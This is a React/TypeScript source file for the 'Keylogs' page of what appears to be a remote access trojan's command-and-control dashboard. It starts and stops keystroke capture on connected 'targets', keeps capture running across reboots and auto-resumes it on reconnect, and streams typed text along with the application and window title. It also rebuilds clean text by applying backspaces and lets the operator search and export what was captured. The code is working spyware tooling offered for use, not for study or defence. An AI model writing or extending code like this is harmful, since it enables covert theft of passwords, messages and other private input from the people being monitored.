import { useState, useEffect, useRef, useCallback } from 'react'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import ClientFilter from '../../UI/ClientFilter'
import type { ClientInfo } from '../../UI/ClientFilter'
import { useDashboardStore } from '../../store/dashboardStore.ts'

interface KeylogEntry {
  id?: number
  clientId: string
  key: string
  app: string
  win: string
  ts: number
}

interface KeylogGroup {
  id: string
  backendIds: number[]
  clientId: string
  app: string
  win: string
  text: string
  cleanText: string
  timestamp: number
}

type CaptureMap = Record<string, boolean>

// Clean raw keystroke text by applying [Backspace] and stripping noise keys
function cleanKeystrokes(raw: string): string {
  if (!raw) return ''
  let result = ''
  let i = 0
  while (i < raw.length) {
    if (raw[i] === '[') {
      const close = raw.indexOf(']', i)
      if (close === -1) { result += raw[i]; i++; continue }
      const token = raw.slice(i + 1, close).toLowerCase()
      if (token === 'backspace' || token === 'bs') {
        if (result.length > 0) result = result.slice(0, -1)
      }
      // All other [xxx] tokens are skipped
      i = close + 1
    } else {
      result += raw[i]
      i++
    }
  }
  return result
}

function buildGroups(entries: KeylogEntry[]): KeylogGroup[] {
  if (!entries.length) return []
  const groups: KeylogGroup[] = []
  let cur: KeylogGroup | null = null
  for (const e of entries) {
    if (!cur || cur.app !== e.app || cur.win !== e.win || cur.clientId !== e.clientId) {
      if (cur) groups.push(cur)
      cur = { 
        id: Math.random().toString(36).slice(2), 
        backendIds: e.id ? [e.id] : [],
        clientId: e.clientId,
        app: e.app, 
        win: e.win, 
        text: e.key, 
        cleanText: cleanKeystrokes(e.key), 
        timestamp: e.ts 
      }
    } else {
      if (e.id) cur.backendIds.push(e.id)
      cur.text += e.key
      cur.cleanText = cleanKeystrokes(cur.text)
    }
  }
  if (cur) groups.push(cur)
  return groups
}

function fmtTime(ts: number) {
  return new Date(ts).toLocaleTimeString('en-US', { hour12: false })
}
function fmtFull(ts: number) {
  return new Date(ts).toLocaleString('en-US', { hour12: false })
}

const APP_COLORS: Record<string, string> = {}
const PALETTE = ['text-sky-400','text-emerald-400','text-violet-400','text-amber-400','text-rose-400','text-teal-400','text-orange-400']
let paletteIdx = 0
function appColor(app: string) {
  if (!app) return 'text-slate-400'
  if (!APP_COLORS[app]) { APP_COLORS[app] = PALETTE[paletteIdx % PALETTE.length]; paletteIdx++ }
  return APP_COLORS[app]
}

export default function KeylogsPage() {
  const { isConnected, subscribe, send } = useBridgeWebSocket()
  const { impersonateUserId, clients: cachedClients } = useDashboardStore()

  const [clients, setClients]       = useState<ClientInfo[]>([])
  const [clientId, setClientId]     = useState('all')
  const [captureMap, setCaptureMap] = useState<CaptureMap>({})
  const [groups, setGroups]         = useState<KeylogGroup[]>([])
  const [search, setSearch]         = useState('')
  const [showClean, setShowClean]   = useState(false)
  const [autoScroll, setAutoScroll] = useState(true)

  const allEntriesRef = useRef<Record<string, KeylogEntry[]>>({})
  const bottomRef     = useRef<HTMLDivElement>(null)

  const onlineIds = new Set(clients.filter(c => c.is_online).map(c => c.id))
  const anyCapturing = Object.values(captureMap).some(Boolean)
  const onlineCapturing = clients.filter(c => c.is_online && captureMap[c.id])

  // Load keylog status whenever WS connects
  useEffect(() => {
    if (!isConnected) return
    send({ type: 'db_query', query: 'get_keylog_status', impersonateUserId: impersonateUserId ?? undefined })
  }, [isConnected, send, impersonateUserId])

  useEffect(() => {
    if (cachedClients.length > 0) {
      setClients(cachedClients as ClientInfo[])
    }
  }, [cachedClients])

  // DB responses
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('db_response', (msg: any) => {
      if (msg.query === 'get_clients') setClients(msg.data || [])
      if (msg.query === 'get_keylog_status') {
        const map: CaptureMap = {}
        for (const c of (msg.data || [])) map[c.id] = true
        setCaptureMap(map)
      }
      if (msg.query === 'get_keylogs') {
        const cid = msg.clientId as string
        if (!cid) return
        const entries: KeylogEntry[] = (msg.data || []).map((row: any) => ({
          id: row.id,
          clientId: row.client_id || cid,
          key: row.keystrokes || '', app: row.application || '',
          win: row.window_title || '', ts: row.timestamp || 0,
        })).reverse()
        allEntriesRef.current[cid] = entries
        rebuildGroups()
      }
    })
    // Real-time online/offline updates
    const unsub2 = subscribe('client_list', (msg: any) => {
      if (Array.isArray(msg.clients)) setClients(msg.clients)
    })
    return () => { unsub(); unsub2() }
  }, [isConnected, subscribe])

  // Live keystroke stream
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('keylog_data', (msg: any) => {
      const cid: string = msg.clientId
      if (!cid) return
      allEntriesRef.current[cid] = [...(allEntriesRef.current[cid] || []), ...(msg.entries || [])]
      rebuildGroups()
    })
    return () => unsub()
  }, [isConnected, subscribe, clientId])

  // Capture status events (start/stop/auto_resume from bridge)
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('keylog_status', (msg: any) => {
      if (!msg.clientId) return
      setCaptureMap(prev => ({ ...prev, [msg.clientId]: !!msg.active }))
      if (msg.auto_resumed) {
        send({ type: 'db_query', query: 'get_keylogs', clientId: msg.clientId, limit: 500 })
      }
    })
    return () => unsub()
  }, [isConnected, subscribe, send])

  const rebuildGroups = useCallback(() => {
    if (clientId === 'all') {
      const all = Object.values(allEntriesRef.current).flat().sort((a, b) => a.ts - b.ts)
      setGroups(buildGroups(all))
    } else {
      setGroups(buildGroups(allEntriesRef.current[clientId] || []))
    }
  }, [clientId])

  useEffect(() => { rebuildGroups() }, [clientId, rebuildGroups])

  useEffect(() => {
    if (autoScroll) bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [groups, autoScroll])

  const handleClientChange = (id: string) => {
    setClientId(id)
    if (id && id !== 'all' && !allEntriesRef.current[id]) {
      send({ type: 'db_query', query: 'get_keylogs', clientId: id, limit: 500, impersonateUserId: impersonateUserId ?? undefined })
    }
  }

  const handleStartAll = () => {
    for (const c of clients.filter(c => c.is_online)) {
      send({ type: 'command', clientId: c.id, command: 'keylog_start' })
      if (!allEntriesRef.current[c.id])
        send({ type: 'db_query', query: 'get_keylogs', clientId: c.id, limit: 500, impersonateUserId: impersonateUserId ?? undefined })
    }
  }

  const handleStopAll = () => {
    for (const c of clients.filter(c => captureMap[c.id]))
      send({ type: 'command', clientId: c.id, command: 'keylog_stop' })
  }

  const handleToggleClient = (id: string) => {
    if (captureMap[id]) {
      send({ type: 'command', clientId: id, command: 'keylog_stop' })
    } else {
      send({ type: 'command', clientId: id, command: 'keylog_start' })
      if (!allEntriesRef.current[id])
        send({ type: 'db_query', query: 'get_keylogs', clientId: id, limit: 500, impersonateUserId: impersonateUserId ?? undefined })
    }
  }

  const handleClear = () => {
    if (clientId === 'all') { allEntriesRef.current = {}; setGroups([]) }
    else { allEntriesRef.current[clientId] = []; rebuildGroups() }
  }

  const handleDeleteGroup = (group: KeylogGroup) => {
    if (!group.backendIds.length) {
      // If it's a live keylog group not yet populated with DB ids, just removing locally
      if (allEntriesRef.current[group.clientId]) {
        allEntriesRef.current[group.clientId] = allEntriesRef.current[group.clientId].filter(e => !group.backendIds.includes(e.id as number) && e.ts !== group.timestamp)
        rebuildGroups()
      }
      return
    }

    send({ type: 'db_query', query: 'delete_keylogs_group', clientId: group.clientId, ids: group.backendIds, impersonateUserId: impersonateUserId ?? undefined })
    
    // Optimistic local update
    if (allEntriesRef.current[group.clientId]) {
      allEntriesRef.current[group.clientId] = allEntriesRef.current[group.clientId].filter(e => e.id ? !group.backendIds.includes(e.id) : true)
      rebuildGroups()
    }
  }

  const handleExport = () => {
    const lines = filtered.map(g =>
      `[${fmtFull(g.timestamp)}] ${g.app} - ${g.win}\n${g.text}\n`
    ).join('\n')
    const blob = new Blob([lines], { type: 'text/plain' })
    const a = document.createElement('a')
    a.href = URL.createObjectURL(blob)
    a.download = `keylogs-${clientId.slice(0,8)}-${Date.now()}.txt`
    a.click()
  }

  const captureBadges: Record<string, { label: string; color: string }> = {}
  for (const c of clients) {
    if (captureMap[c.id] && c.is_online)
      captureBadges[c.id] = { label: 'REC', color: 'text-emerald-400 border-emerald-700/50 bg-emerald-900/30' }
    else if (captureMap[c.id] && !c.is_online)
      captureBadges[c.id] = { label: 'PAUSED', color: 'text-amber-400 border-amber-700/50 bg-amber-900/20' }
  }

  const filtered = search.trim()
    ? groups.filter(g =>
        g.text.toLowerCase().includes(search.toLowerCase()) ||
        g.app.toLowerCase().includes(search.toLowerCase()) ||
        g.win.toLowerCase().includes(search.toLowerCase()))
    : groups

  const totalStrokes = Object.values(allEntriesRef.current).reduce((s, arr) => s + arr.length, 0)

  return (
    <div className="flex flex-col h-full space-y-4 min-h-0">

      {/* ── Header ─────────────────────────────────────────────────────── */}
      <div className="flex items-start justify-between flex-wrap gap-3">
        <div>
          <h3 className="text-2xl font-semibold text-slate-100 tracking-tight">
            Keylogs
          </h3>
          <p className="text-sm text-slate-500 mt-0.5">
            Persistent capture across all targets — survives reboots &amp; reconnects.
          </p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <button onClick={handleStartAll} disabled={!isConnected || onlineIds.size === 0}
            className="px-3 py-1.5 text-xs font-semibold rounded-md bg-emerald-600/15 text-emerald-400 border border-emerald-700/40 hover:bg-emerald-600/25 disabled:opacity-40 transition-all flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
            Start All ({onlineIds.size} online)
          </button>
          <button onClick={handleStopAll} disabled={!anyCapturing}
            className="px-3 py-1.5 text-xs font-semibold rounded-md bg-red-600/15 text-red-400 border border-red-700/40 hover:bg-red-600/25 disabled:opacity-40 transition-all">
            Stop All
          </button>
          <button onClick={handleExport} disabled={!groups.length}
            className="px-3 py-1.5 text-xs font-medium rounded-md bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700 disabled:opacity-40 transition-all">
            Export
          </button>
          <button onClick={handleClear} disabled={!groups.length}
            className="px-3 py-1.5 text-xs font-medium rounded-md bg-slate-800 text-slate-400 border border-slate-700 hover:bg-slate-700 disabled:opacity-40 transition-all">
            Clear
          </button>
        </div>
      </div>

      {/* ── Capture status strips ───────────────────────────────────────── */}
      {onlineCapturing.length > 0 && (
        <div className="flex items-center gap-2 flex-wrap px-3 py-2 bg-emerald-950/40 border border-emerald-800/40 rounded-lg">
          <span className="text-[11px] text-emerald-500 font-semibold flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
            CAPTURING:
          </span>
          {onlineCapturing.map(c => (
            <button key={c.id} onClick={() => handleToggleClient(c.id)} title="Click to stop"
              className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-900/40 border border-emerald-700/40 text-emerald-300 text-[11px] font-mono hover:bg-red-900/30 hover:text-red-400 hover:border-red-700/40 transition-colors">
              {c.hostname} <span className="opacity-50 ml-0.5">×</span>
            </button>
          ))}
        </div>
      )}

      {clients.filter(c => !c.is_online && captureMap[c.id]).length > 0 && (
        <div className="flex items-center gap-2 flex-wrap px-3 py-2 bg-amber-950/30 border border-amber-800/30 rounded-lg">
          <span className="text-[11px] text-amber-500 font-semibold flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" />
            WILL RESUME ON RECONNECT:
          </span>
          {clients.filter(c => !c.is_online && captureMap[c.id]).map(c => (
            <span key={c.id} className="px-2 py-0.5 rounded-full bg-amber-900/30 border border-amber-700/30 text-amber-300 text-[11px] font-mono">
              {c.hostname}
            </span>
          ))}
        </div>
      )}

      {/* ── Controls row ────────────────────────────────────────────────── */}
      <div className="flex items-center gap-3 flex-wrap">
        <ClientFilter
          clients={clients}
          value={clientId}
          onChange={handleClientChange}
          allowAll
          allLabel="All clients"
          placeholder="Select target..."
          badges={captureBadges}
        />

        {clientId !== 'all' && clientId && (
          <button onClick={() => handleToggleClient(clientId)} disabled={!isConnected}
            className={`px-3 py-1.5 text-xs font-semibold rounded-md border transition-all disabled:opacity-40 ${
              captureMap[clientId]
                ? 'bg-red-600/15 text-red-400 border-red-700/40 hover:bg-red-600/25'
                : 'bg-emerald-600/15 text-emerald-400 border-emerald-700/40 hover:bg-emerald-600/25'
            }`}>
            {captureMap[clientId] ? 'Stop this client' : 'Start this client'}
          </button>
        )}

        <div className="relative flex-1 min-w-50">
          <input
            type="text"
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Filter keys, app, window title..."
            className="w-full pl-4 pr-8 py-1.5 bg-slate-900 border border-slate-700 rounded-md text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:border-slate-500"
          />
          {search && (
            <button onClick={() => setSearch('')}
              className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 text-xs">
              ×
            </button>
          )}
        </div>
      </div>

      {/* ── Stats bar ───────────────────────────────────────────────────── */}
      <div className="flex items-center gap-4 text-[11px] text-slate-600">
        <span><span className="text-slate-400">{filtered.length}</span> groups</span>
        <span><span className="text-slate-400">{totalStrokes}</span> keystrokes total</span>
        <span><span className="text-slate-400">{onlineCapturing.length}</span> clients recording</span>
        {search && <span className="text-sky-500">{filtered.length} match{filtered.length !== 1 ? 'es' : ''}</span>}
        <label className="inline-flex items-center gap-1.5 cursor-pointer ml-auto">
          <input
            type="checkbox"
            checked={showClean}
            onChange={e => setShowClean(e.target.checked)}
            className="size-3.5 rounded border-slate-600 bg-slate-900 text-brand-600 focus:ring-brand-500"
          />
          <span className="text-slate-500">Show clean</span>
        </label>
      </div>

      {/* ── Feed ────────────────────────────────────────────────────────── */}
      <div className="flex-1 min-h-0 bg-slate-950 border border-slate-800 rounded-lg overflow-y-auto font-mono text-sm">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-64 text-slate-600 gap-3">
            <span className="text-4xl opacity-20">⌨</span>
            {onlineCapturing.length > 0
              ? <span>Waiting for keystrokes...</span>
              : <span>Click <span className="text-emerald-500 font-semibold">Start All</span> to begin capture on all online targets</span>
            }
          </div>
        ) : (
          <div className="divide-y divide-slate-800/50">
            {filtered.map(group => (
              <div key={group.id} className="flex hover:bg-slate-900/60 transition-colors group">
                <div className="flex-none w-52 px-3 py-2 border-r border-slate-800/60 flex flex-col gap-0.5 shrink-0 relative">
                  <div className="flex items-center justify-between">
                    <span className="text-slate-600 text-[10px] font-mono">{fmtTime(group.timestamp)}</span>
                    <button 
                      onClick={() => handleDeleteGroup(group)}
                      className="opacity-0 group-hover:opacity-100 text-rose-500 hover:text-rose-400 p-1 hover:bg-rose-500/10 rounded transition-all"
                      title="Delete recorded keys"
                    >
                      <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                    </button>
                  </div>
                  <span className={`text-[11px] font-bold truncate tracking-wide ${appColor(group.app)}`}>
                    {group.app || 'unknown'}
                  </span>
                  
                  {group.app.toLowerCase().match(/chrome|firefox|edge|brave|opera|safari/) ? (
                    <a 
                      href={`https://duckduckgo.com/?q=!ducky+${encodeURIComponent(group.win.replace(/ - (Google Chrome|Mozilla Firefox|Microsoft Edge|Personal - Microsoft Edge|Brave|Opera|Safari)$/i, ''))}`}
                      target="_blank" 
                      rel="noreferrer"
                      title="Open guessed website link"
                      className="text-sky-500 hover:text-sky-400 hover:underline text-[10px] truncate flex items-center gap-1 mt-0.5"
                    >
                      {group.win || '—'}
                      <svg className="w-2.5 h-2.5 inline-block opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
                    </a>
                  ) : (
                    <span className="text-slate-600 text-[10px] truncate" title={group.win}>
                      {group.win || '—'}
                    </span>
                  )}
                </div>
                <div className="flex-1 min-w-0 px-4 py-2 text-slate-200 whitespace-pre-wrap break-all leading-relaxed text-[13px] selection:bg-sky-800">
                  {showClean ? group.cleanText : group.text}
                </div>
              </div>
            ))}
            <div ref={bottomRef} />
          </div>
        )}
      </div>

      {/* ── Footer ──────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between text-[11px] text-slate-600">
        <span>Auto-scroll</span>
        <button onClick={() => setAutoScroll(p => !p)}
          className={`w-9 h-5 rounded-full transition-colors relative ${autoScroll ? 'bg-emerald-600' : 'bg-slate-700'}`}>
          <span className={`absolute top-0.5 w-4 h-4 bg-white rounded-full shadow transition-transform ${autoScroll ? 'translate-x-4' : 'translate-x-0.5'}`} />
        </button>
      </div>
    </div>
  )
}
